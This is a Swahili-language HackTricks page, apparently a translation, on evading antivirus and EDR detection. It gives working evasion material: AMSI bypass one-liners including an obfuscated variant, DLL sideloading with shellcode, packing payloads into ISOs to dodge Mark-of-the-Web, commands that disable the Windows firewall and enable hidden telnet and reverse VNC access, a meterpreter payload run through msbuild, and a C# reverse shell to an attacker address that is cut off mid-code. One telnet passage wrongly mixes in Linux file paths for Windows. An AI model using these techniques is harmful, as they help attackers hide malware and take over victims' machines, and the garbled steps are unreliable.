# Kuepuka Kugunduliwa na Antivirus (AV)

<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka mwanzo hadi kuwa bingwa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako inatangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**swag rasmi ya PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**The PEASS Family**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

**Ukurasa huu uliandikwa na** [**@m2rc\_p**](https://twitter.com/m2rc\_p)**!**

## **Mbinu za Kuepuka AV**

Kwa sasa, AV hutumia njia tofauti za kuchunguza ikiwa faili ni mbaya au la, kugundua tuli, uchambuzi wa kina, na kwa EDR za juu zaidi, uchambuzi wa tabia.

### **Kugundua tuli**

Kugundua tuli hufanikiwa kwa kuweka alama herufi au safu za herufi mbaya katika faili ya binary au skripti, na pia kuchukua habari kutoka kwenye faili yenyewe (k.m. maelezo ya faili, jina la kampuni, saini za dijiti, ikoni, checksum, nk.). Hii inamaanisha kwamba kutumia zana za umma zinaweza kukusababisha kukamatwa kwa urahisi zaidi, kwani labda zimechunguzwa na kuwekwa alama kama mbaya. Kuna njia kadhaa za kuepuka aina hii ya ugunduzi:

* **Ufichaji**

Ikiwa unaificha faili ya binary, hakutakuwa na njia ya AV kugundua programu yako, lakini utahitaji aina fulani ya mzigo wa kuificha na kuendesha programu kumbukani.

* **Kuficha**

Marafiki wakati mwingine unachohitaji kufanya ni kubadilisha baadhi ya herufi katika faili yako ya binary au skripti ili iweze kupita AV, lakini hii inaweza kuwa kazi inayochukua muda kulingana na unachotaka kuficha.

* **Zana za kawaida**

Ikiwa unatengeneza zana zako mwenyewe, haitakuwa na saini mbaya inayojulikana, lakini hii inachukua muda na juhudi nyingi.

{% hint style="info" %}
Njia nzuri ya kuchunguza dhidi ya ugunduzi tuli wa Windows Defender ni [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Kimsingi inagawanya faili katika sehemu kadhaa na kisha inaagiza Defender kuchunguza kila moja kwa kujitegemea, kwa njia hii, inaweza kukwambia haswa ni herufi au safu zilizo na alama mbaya katika faili yako ya binary.
{% endhint %}

Napendekeza sana uangalie [orodha ya kucheza ya YouTube](https://www.youtube.com/playlist?list=PLj05gPj8rk\_pkb12mDe4PgYZ5qPxhGKGf) kuhusu Kuepuka AV kwa vitendo.

### **Uchambuzi wa kina**

Uchambuzi wa kina ni wakati AV inaendesha binary yako kwenye sanduku la majaribio na inatazama shughuli mbaya (k.m. jaribio la kufichua na kusoma nywila za kivinjari chako, kufanya minidump kwenye LSASS, nk.). Sehemu hii inaweza kuwa ngumu kidogo kufanya kazi nayo, lakini hapa kuna mambo kadhaa unayoweza kufanya kuepuka sanduku la majaribio.

* **Lala kabla ya utekelezaji** Kulingana na jinsi ilivyotekelezwa, inaweza kuwa njia nzuri ya kuepuka uchambuzi wa kina wa AV. AV ina muda mfupi sana wa kuchunguza faili ili isisumbue utendaji wa mtumiaji, kwa hivyo kutumia muda mrefu wa kulala kunaweza kuvuruga uchambuzi wa binary. Tatizo ni kwamba sanduku la majaribio la AV nyingi linaweza tu kupuuza usingizi kulingana na jinsi ilivyotekelezwa.
* **Kuchunguza rasilimali za kompyuta** Kawaida sanduku la majaribio lina rasilimali kidogo sana za kufanya kazi (k.m. <2GB RAM), vinginevyo inaweza kupunguza kasi ya kompyuta ya mtumiaji. Unaweza pia kuwa na ubunifu sana hapa, kwa mfano kwa kuchunguza joto la CPU au hata kasi ya kifaa cha baridi, sio kila kitu kitatekelezwa kwenye sanduku la majaribio.
* **Uchunguzi maalum wa kompyuta** Ikiwa unataka kulenga mtumiaji ambaye kituo chake cha kazi kimejiunga na kikoa cha "contoso.local", unaweza kufanya ukaguzi kwenye kikoa cha kompyuta ili kuona ikiwa kinalingana na kile ulichotaja, ikiwa haifanyi hivyo, unaweza kufanya programu yako ijitokeze.

Inageuka kuwa jina la kompyuta ya Sanduku la Majaribio la Microsoft Defender ni HAL9TH, kwa hivyo, unaweza kuangalia jina la kompyuta katika zisomaji wako kabla ya kulipua, ikiwa jina linalingana na HAL9TH, inamaanisha kuwa upo ndani ya sanduku la majaribio la defender, kwa hivyo unaweza kufanya programu yako ijitokeze.

<figure><img src="../.gitbook/assets/image (3) (6).png" alt=""><figcaption><p>chanzo: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Mbinu nyingine nzuri kutoka [@mgeeky](https://twitter.com/mariuszbit) kwa kupingana na Sanduku la Majaribio

<figure><img src="../.gitbook/assets/image (2) (1) (1) (2) (1).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

Kama tulivyosema hapo awali katika chapisho hili, **zana za umma** hatimaye **zitagunduliwa**, kwa hivyo, unapaswa kujiuliza kitu:

Kwa mfano, ikiwa unataka kudondosha LSASS, **je! Unahitaji kweli kutumia mimikatz**? Au unaweza kutumia mradi tofauti ambao haujulikani sana na pia kudondosha LSASS.

Jibu sahihi labda ni la mwisho. Kuchukua mimikatz kama mfano, labda ni moja ya, ikiwa sio zana iliyowekwa alama zaidi na AV na EDR, wakati mradi wenyewe ni mzuri sana, pia ni jinamizi kufanya kazi nayo ili kuepuka AV, kwa hivyo tafuta njia mbadala kwa kile unachotaka kufanikisha.

{% hint style="info" %}
Unapobadilisha mizigo yako kwa kuepuka, hakikisha kuzima
## DLL Sideloading & Proxying

**DLL Sideloading** inatumia utaratibu wa utafutaji wa DLL unaotumiwa na kifurushi kwa kuweka programu ya mwathirika na mzigo mbaya kando kando.

Unaweza kuchunguza programu zinazoweza kuathiriwa na DLL Sideloading kwa kutumia [Siofra](https://github.com/Cybereason/siofra) na hati ya powershell ifuatayo:

{% code overflow="wrap" %}
```powershell
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
{% endcode %}

Amri hii itatoa orodha ya programu zinazoweza kudukuliwa kwa kutumia DLL hijacking ndani ya "C: \ Program Files \\" na faili za DLL wanazojaribu kupakia.

Napendekeza sana **uchunguze programu zinazoweza kudukuliwa kwa kutumia DLL mwenyewe**, mbinu hii ni ya siri sana ikiwa imefanywa kwa usahihi, lakini ikiwa utatumia programu za DLL zinazojulikana hadharani, unaweza kugunduliwa kwa urahisi.

Kwa kuweka tu DLL mbaya na jina ambalo programu inatarajia kupakia, haitapakia mzigo wako, kwani programu inatarajia kazi maalum ndani ya DLL hiyo, ili kurekebisha shida hii, tutatumia mbinu nyingine inayoitwa **DLL Proxying/Forwarding**.

**DLL Proxying** inapeleka wito ambao programu inafanya kutoka kwenye DLL ya mwendeshaji (na mbaya) kwa DLL ya asili, hivyo kuwezesha utendaji wa programu na kuweza kushughulikia utekelezaji wa mzigo wako.

Nitatumia mradi wa [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) kutoka kwa [@flangvik](https://twitter.com/Flangvik/)

Hizi ni hatua nilizofuata:

{% code overflow="wrap" %}
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
{% endcode %}

Amri ya mwisho itatupa faili 2: templeti ya chanzo cha DLL na DLL iliyobadilishwa jina lake.

<figure><img src="../.gitbook/assets/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>

{% code overflow="wrap" %}
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
{% endcode %}

Hizi ni matokeo:

<figure><img src="../.gitbook/assets/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Shellcode yetu (imefichwa na [SGN](https://github.com/EgeBalci/sgn)) na DLL ya proxy zina kiwango cha 0/26 cha kugundulika katika [antiscan.me](https://antiscan.me)! Ningependa kuita hilo kuwa ni mafanikio.

<figure><img src="../.gitbook/assets/image (11) (3).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
Napendekeza sana uangalie [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) kuhusu DLL Sideloading na pia [video ya ippsec](https://www.youtube.com/watch?v=3eROsG\_WNpE) ili kujifunza zaidi kuhusu tuliyozungumza kwa kina zaidi.
{% endhint %}

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze ni zana ya malipo kwa kuepuka EDRs kwa kutumia michakato iliyosimamishwa, syscalls moja kwa moja, na njia mbadala za utekelezaji`

Unaweza kutumia Freeze kupakia na kutekeleza shellcode yako kwa njia ya siri.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../.gitbook/assets/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
Kuepuka ni mchezo wa paka na panya tu, kile kinachofanya kazi leo kinaweza kugunduliwa kesho, kwa hivyo kamwe usitegemee zana moja tu, ikiwezekana, jaribu kuunganisha mbinu kadhaa za kuepuka.
{% endhint %}

## AMSI (Interface ya Uchunguzi wa Kupambana na Programu Hasidi)

AMSI iliumbwa ili kuzuia "[programu hasidi isiyohifadhiwa kwenye faili](https://en.wikipedia.org/wiki/Fileless\_malware)". Awali, AVs walikuwa na uwezo wa kuchunguza **faili kwenye diski**, kwa hivyo ikiwa unaweza kwa njia fulani kutekeleza mizigo **moja kwa moja kwenye kumbukumbu**, AV hakuweza kufanya chochote kuzuia hilo, kwani haikuwa na uwezo wa kutosha.

Kipengele cha AMSI kimejumuishwa katika sehemu hizi za Windows.

* User Account Control, au UAC (kuinua EXE, COM, MSI, au usakinishaji wa ActiveX)
* PowerShell (maandishi, matumizi ya kuingiliana, na tathmini ya nambari ya kibinadamu)
* Windows Script Host (wscript.exe na cscript.exe)
* JavaScript na VBScript
* Macros za Ofisi VBA

Inaruhusu suluhisho za antivirus kuchunguza tabia ya hati kwa kufunua maudhui ya hati katika fomu ambayo hayajafichwa na hayajafichuliwa.

Kukimbia `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` kutazalisha onyo lifuatalo kwenye Windows Defender.

<figure><img src="../.gitbook/assets/image (4) (5).png" alt=""><figcaption></figcaption></figure>

Tazama jinsi inavyoongeza `amsi:` na kisha njia ya faili ya kutekelezwa ambayo hati ilikimbia kutoka, katika kesi hii, powershell.exe

Hatukudondosha faili yoyote kwenye diski, lakini bado tukakamatwa kwenye kumbukumbu kwa sababu ya AMSI.

Kuna njia kadhaa za kuepuka AMSI:

* **Ufichaji**

Kwa kuwa AMSI kimsingi hufanya kazi na uchunguzi wa tuli, kwa hivyo, kubadilisha hati unazojaribu kupakia inaweza kuwa njia nzuri ya kuepuka kugunduliwa.

Hata hivyo, AMSI ina uwezo wa kufichua hati hata ikiwa ina safu nyingi, kwa hivyo ufichaji unaweza kuwa chaguo mbaya kulingana na jinsi unavyofanywa. Hii inafanya iwe ngumu kuepuka. Walakini, mara nyingine, yote unayohitaji kufanya ni kubadilisha majina ya kipekee ya kubadilika na utakuwa sawa, kwa hivyo inategemea ni kiasi gani kitu kimepewa alama.

* **Kuepuka AMSI**

Kwa kuwa AMSI inatekelezwa kwa kupakia DLL kwenye mchakato wa powershell (pia cscript.exe, wscript.exe, nk.), ni rahisi kuharibu hata ukiendesha kama mtumiaji asiye na mamlaka. Kwa sababu ya kasoro hii katika utekelezaji wa AMSI, watafiti wamegundua njia kadhaa za kuepuka uchunguzi wa AMSI.

**Kulazimisha Kosa**

Kulazimisha kushindwa kwa kuanzisha AMSI (amsiInitFailed) kutafanya uchunguzi wowote usianzishwe kwa mchakato wa sasa. Awali hii ilifichuliwa na [Matt Graeber](https://twitter.com/mattifestation) na Microsoft imeendeleza saini ya kuzuia matumizi zaidi.

{% code overflow="wrap" %}
```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
{% endcode %}

Inahitajika tu mstari mmoja wa nambari ya powershell ili kufanya AMSI isitumike kwa mchakato wa sasa wa powershell. Mstari huu umekuwa ukifanyiwa uchunguzi na AMSI yenyewe, kwa hivyo mabadiliko fulani yanahitajika ili kutumia mbinu hii.

Hapa kuna njia ya kuzunguka AMSI iliyobadilishwa niliyopata kutoka kwa [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).
```powershell
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
**Kumbuka, kwamba hii labda itaonekana kuwa ya hatari mara tu chapisho hili litakapochapishwa, kwa hivyo usichapishe nambari yoyote ikiwa lengo lako ni kubaki bila kugundulika.**

**Kupachika Kumbukumbu**

Mbinu hii iligunduliwa awali na [@RastaMouse](https://twitter.com/\_RastaMouse/) na inahusisha kupata anwani ya kazi ya "AmsiScanBuffer" katika amsi.dll (inayowajibika kwa uchunguzi wa kuingiza data kutoka kwa mtumiaji) na kuibadilisha na maagizo ya kurudisha nambari ya E\_INVALIDARG, kwa njia hii, matokeo ya uchunguzi halisi yatarudi 0, ambayo inachukuliwa kama matokeo safi.

{% hint style="info" %}
Tafadhali soma [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) kwa maelezo zaidi.
{% endhint %}

Kuna pia mbinu nyingine nyingi zinazotumiwa kuvuka AMSI na powershell, angalia [**ukurasa huu**](basic-powershell-for-pentesters/#amsi-bypass) na [repo hii](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) kujifunza zaidi kuhusu mbinu hizo.

Au hati hii ambayo kupitia kupachika kumbukumbu itapachika kila Powersh mpya

## Kuficha

Kuna zana kadhaa zinazoweza kutumika kuficha nambari wazi ya C#, kuzalisha templeti za metaprogramming kwa kubadilisha faili za binary au kuficha faili za binary zilizobadilishwa kama vile:

* [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: Kuficha C#**
* [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Lengo la mradi huu ni kutoa tawi la chanzo wazi la [LLVM](http://www.llvm.org/) ambayo inaweza kutoa usalama wa programu ulioongezeka kupitia [kuficha nambari](http://en.wikipedia.org/wiki/Obfuscation\_\(software\)) na kufanya iwe ngumu kubadilika.
* [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator inaonyesha jinsi ya kutumia lugha ya `C++11/14` kuzalisha, wakati wa kubadilisha, nambari iliyofichwa bila kutumia zana za nje na bila kubadilisha kisakinishi.
* [**obfy**](https://github.com/fritzone/obfy): Ongeza safu ya shughuli zilizofichwa zilizozalishwa na mfumo wa templeti ya C++ ambayo itafanya maisha ya mtu anayetaka kuvunja programu kuwa ngumu kidogo.
* [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz ni kificha cha faili za binary za x64 ambacho kinaweza kuficha faili tofauti za pe ikiwa ni pamoja na: .exe, .dll, .sys
* [**metame**](https://github.com/a0rtega/metame): Metame ni injini rahisi ya nambari ya metamorphic kwa faili za kutekelezwa za aina yoyote.
* [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator ni mfumo wa kuficha nambari ya kiwango cha chini kwa lugha zinazoungwa mkono na LLVM kwa kutumia ROP (return-oriented programming). ROPfuscator inaficha programu kwa kiwango cha nambari ya mkutano kwa kubadilisha maagizo ya kawaida kuwa minyororo ya ROP, ikizuia dhana yetu ya kawaida ya mtiririko wa kudhibiti.
* [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt ni .NET PE Crypter iliyoandikwa kwa Nim
* [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor inaweza kubadilisha EXE/DLL iliyopo kuwa shellcode na kisha kuzipakia

## SmartScreen & MoTW

Huenda umewahi kuona skrini hii unapopakua baadhi ya faili za kutekelezwa kutoka kwenye mtandao na kuzitekeleza.

Microsoft Defender SmartScreen ni kifaa cha usalama kinacholenga kulinda mtumiaji wa mwisho dhidi ya kutekeleza programu ambazo zinaweza kuwa na nia mbaya.

<figure><img src="../.gitbook/assets/image (1) (4).png" alt=""><figcaption></figcaption></figure>

SmartScreen kwa kiasi kikubwa hufanya kazi kwa njia ya msingi wa sifa, maana programu zisizopakuliwa kawaida zitasababisha SmartScreen hivyo kumjulisha na kumzuia mtumiaji wa mwisho kutekeleza faili (ingawa faili inaweza bado kutekelezwa kwa kubonyeza More Info -> Run anyway).

**MoTW** (Mark of The Web) ni [NTFS Alternate Data Stream](https://en.wikipedia.org/wiki/NTFS#Alternate\_data\_stream\_\(ADS\)) na jina la Zone.Identifier ambayo inaundwa moja kwa moja baada ya kupakua faili kutoka kwenye mtandao, pamoja na URL iliyopakuliwa kutoka.

<figure><img src="../.gitbook/assets/image (13) (3).png" alt=""><figcaption><p>Kuangalia Zone.Identifier ADS kwa faili iliyopakuliwa kutoka kwenye mtandao.</p></figcaption></figure>

{% hint style="info" %}
Ni muhimu kutambua kuwa programu zilizosainiwa na cheti cha **kuaminika** cha saini **hazitasababisha SmartScreen**.
{% endhint %}

Njia yenye ufanisi sana ya kuzuia mizigo yako kupata Mark of The Web ni kwa kuzipakia ndani ya chombo fulani kama ISO. Hii hutokea kwa sababu Mark-of-the-Web (MOTW) **haiwezi** kutumika kwa kiasi kisichokuwa cha NTFS.

<figure><img src="../.gitbook/assets/image (12) (2) (2).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) ni zana ambayo inapakia mizigo ndani ya chombo cha pato ili kuepuka Mark-of-the-Web.

Matumizi ya mfano:
```powershell
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Hapa kuna demo ya kuvuka SmartScreen kwa kufunga malipo ndani ya faili za ISO kwa kutumia [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../.gitbook/assets/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## Uchunguzi wa Kusanyiko la C#

Kupakia faili za C# kwenye kumbukumbu kumekuwa maarufu kwa muda mrefu na bado ni njia nzuri sana ya kuendesha zana zako za baada ya uchunguzi bila kugunduliwa na AV.

Kwa kuwa malipo yatawekwa moja kwa moja kwenye kumbukumbu bila kugusa diski, tutahitaji tu kuhangaika na kusahihisha AMSI kwa mchakato mzima.

Mifumo mingi ya C2 (sliver, Covenant, metasploit, CobaltStrike, Havoc, nk.) tayari hutoa uwezo wa kutekeleza kusanyiko za C# moja kwa moja kwenye kumbukumbu, lakini kuna njia tofauti za kufanya hivyo:

* **Fork\&Run**

Inahusisha **kuzaa mchakato mpya wa kujitolea**, kuingiza nambari yako mbaya ya baada ya uchunguzi kwenye mchakato mpya huo, kutekeleza nambari yako mbaya na baada ya kumaliza, kuua mchakato mpya. Hii ina faida na hasara zake. Faida ya njia ya kuzaa na kukimbia ni kwamba utekelezaji unatokea **nje** ya mchakato wetu wa kuingiza Beacon. Hii inamaanisha kuwa ikiwa kitu katika hatua yetu ya baada ya uchunguzi kinakwenda vibaya au kinagunduliwa, kuna **nafasi kubwa zaidi** ya **kuingiza kuishi.** Hasara ni kwamba una **nafasi kubwa** ya kugunduliwa na **Uchunguzi wa Tabia**.

<figure><img src="../.gitbook/assets/image (7) (1) (3).png" alt=""><figcaption></figcaption></figure>

* **Inline**

Inahusu kuingiza nambari mbaya ya baada ya uchunguzi **katika mchakato wake mwenyewe**. Kwa njia hii, unaweza kuepuka kuunda mchakato mpya na kupitia uchunguzi wa AV, lakini hasara ni kwamba ikiwa kitu kinakwenda vibaya na utekelezaji wa malipo yako, kuna **nafasi kubwa zaidi** ya **kupoteza beacon** yako kwani inaweza kugonga.

<figure><img src="../.gitbook/assets/image (9) (3) (1).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
Ikiwa unataka kusoma zaidi juu ya kupakia Kusanyiko la C#, tafadhali angalia makala hii [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) na InlineExecute-Assembly BOF yao ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))
{% endhint %}

Pia unaweza kupakia Kusanyiko la C# **kutoka kwa PowerShell**, angalia [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) na [video ya S3cur3th1sSh1t](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Kutumia Lugha Nyingine za Programu

Kama ilivyopendekezwa katika [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), inawezekana kutekeleza nambari mbaya kwa kutumia lugha nyingine kwa kutoa kompyuta iliyoharibiwa ufikiaji **kwenye mazingira ya mkalimani yaliyosanikishwa kwenye sehemu ya SMB inayodhibitiwa na mshambuliaji**.&#x20;

Kwa kuruhusu ufikiaji kwa Mkalimani wa Binari na mazingira kwenye sehemu ya SMB, unaweza **kutekeleza nambari ya aina yoyote katika lugha hizi kwenye kumbukumbu** ya kompyuta iliyoharibiwa.

Repo inaonyesha: Mlinzi bado anachunguza hati lakini kwa kutumia Go, Java, PHP, nk tunayo **uhuru zaidi wa kuvuka saini za tuli**. Jaribio la hati za kuingiza upande wa nyuma zisizo na ubunifu katika lugha hizi limefanikiwa.

## Uvamizi wa Juu

Uvamizi ni mada ngumu sana, mara nyingi unapaswa kuzingatia vyanzo vingi tofauti vya telemetriki katika mfumo mmoja tu, kwa hivyo ni karibu haiwezekani kubaki kabisa bila kugunduliwa katika mazingira yaliyokomaa.

Kila mazingira unayokabiliana nayo yatakuwa na nguvu na udhaifu wake.

Napendekeza sana uangalie mazungumzo haya kutoka kwa [@ATTL4S](https://twitter.com/DaniLJ94), ili kupata ufahamu zaidi juu ya mbinu za Uvamizi wa Juu.

{% embed url="https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo" %}

Hii pia ni mazungumzo mengine mazuri kutoka kwa [@mariuszbit](https://twitter.com/mariuszbit) kuhusu Uvamizi kwa Kina.

{% embed url="https://www.youtube.com/watch?v=IbA7Ung39o4" %}

## **Mbinu za Zamani**

### **Angalia sehemu ambazo Mlinzi anagundua kuwa ni mbaya**

Unaweza kutumia [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) ambayo itaondoa sehemu za faili mpaka itagundua sehemu ambayo Mlinzi anagundua kuwa ni mbaya na kugawanya kwako.\
Zana nyingine inayofanya **kitu kama hicho ni** [**avred**](https://github.com/dobin/avred) na wavuti wazi inayotoa huduma katika [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Seva ya Telnet**

Hadi Windows10, Windows zote zilikuja na **seva ya Telnet** ambayo unaweza kusakinisha (kama msimamizi) kwa kufanya:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Anza wakati mfumo unapoanza na endesha sasa:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Badilisha bandari ya telnet** (stealth) na zima firewall:

```plaintext
1. Fungua faili ya usanidi ya telnet (/etc/default/telnetd).
2. Badilisha bandari ya telnet kwa bandari isiyo ya kawaida, kama vile 4444.
3. Hifadhi na funga faili ya usanidi ya telnet.
4. Fungua faili ya usanidi ya firewall (/etc/sysconfig/iptables).
5. Lemaza firewall kwa kubadilisha thamani ya "ENABLED" kuwa "no".
6. Hifadhi na funga faili ya usanidi ya firewall.
7. Anza upya huduma ya telnet na firewall ili mabadiliko yafanye kazi.
```

Kwa kufuata hatua hizi, utaweza kubadilisha bandari ya telnet na kuzima firewall kwa njia ya siri.
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Pakua kutoka: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (unahitaji kupakua faili za bin, sio usanidi)

**KATIKA KIFAA CHA MWEZI**: Tekeleza _**winvnc.exe**_ na sanidi seva:

* Wezesha chaguo la _Disable TrayIcon_
* Weka nenosiri katika _VNC Password_
* Weka nenosiri katika _View-Only Password_

Kisha, hamisha faili ya binari _**winvnc.exe**_ na faili mpya iliyoumbwa _**UltraVNC.ini**_ ndani ya **mwathiriwa**

#### **Unganisho la kurudisha**

**Mshambuliaji** anapaswa **kutekeleza ndani** ya **kifaa chake** cha **mwezi** faili ya binari `vncviewer.exe -listen 5900` ili iwe **tayari** kukamata unganisho la kurudisha la **VNC**. Kisha, ndani ya **mwathiriwa**: Anza daemone ya winvnc `winvnc.exe -run` na endesha `winwnc.exe [-autoreconnect] -connect <anwani_ya_mshambuliaji>::5900`

**ANGALIZO:** Ili kudumisha siri, usifanye mambo machache

* Usianze `winvnc` ikiwa tayari inatekelezwa au utasababisha [kidirisha cha arifa](https://i.imgur.com/1SROTTl.png). angalia ikiwa inatekelezwa na `tasklist | findstr winvnc`
* Usianze `winvnc` bila `UltraVNC.ini` katika saraka ile ile au itasababisha [kidirisha cha usanidi](https://i.imgur.com/rfMQWcf.png) kufunguliwa
* Usitekeleze `winvnc -h` kwa msaada au utasababisha [kidirisha cha arifa](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Pakua kutoka: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
Ndani ya GreatSCT:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Sasa **anza lister** na `msfconsole -r file.rc` na **tekeleza** **malipo ya xml** kwa:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**Mlinzi wa sasa atamaliza mchakato haraka sana.**

### Kukusanya kabisa kifaa chetu cha kugeuza

https://medium.com/@Bank\_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Kwanza C# Kigeuzi cha Nyuma

Kikusanye na:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Tumia hii na:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

